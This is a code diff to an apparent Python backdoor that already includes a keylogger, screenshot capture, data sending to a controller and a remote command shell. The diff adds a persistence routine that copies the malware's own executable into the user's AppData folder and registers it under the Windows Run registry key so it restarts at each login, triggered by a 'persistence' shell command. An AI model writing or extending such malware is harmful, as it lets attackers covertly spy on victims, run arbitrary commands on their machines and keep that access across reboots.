@@ -5,6 +5,8 @@ import os
 import pyautogui
 import threading
 import keylogger
+import shutil
+import sys
 
 def send_data(data):
 	jsondata = json.dumps(data)
@@ -41,6 +43,19 @@ def screenshot():
 	scrnsht = pyautogui.screenshot()
 	scrnsht.save("screenshot.png")
 
+def persist(reg_name, copy_name):
+	# creating a copy of the backdoor in appdata folder.
+	file_location = os.environ['appdata'] + '\\' + copy_name
+	try:
+		if not os.path.exists(file_location):
+			shutil.copyfile(sys.executable, file_location) # The first arg specifies what we are copying, in this case we are copying our own executable which is specified by (sys.executable). second param is where we are copying it to: here to the specified file path.
+			# Adding the registry key to the specified file location.
+			subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
+			send_data(f"Created persistence with reg key: {reg_name}")
+		else:
+			send_data("[+] Persistence already exists!")
+	except:
+		send_data("[-] Error creating persistence with the target")
 
 def shell():
 	while True:
@@ -76,6 +91,9 @@ def shell():
 			keylog.self_destruct()
 			t.join()
 			send_data("[+] Keylogger Stopped!")
+		elif command[:11] == "persistence":
+			reg_name, copy_name = command[12:].split(' ')
+			persist(reg_name, copy_name)
 
 		else:
 			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
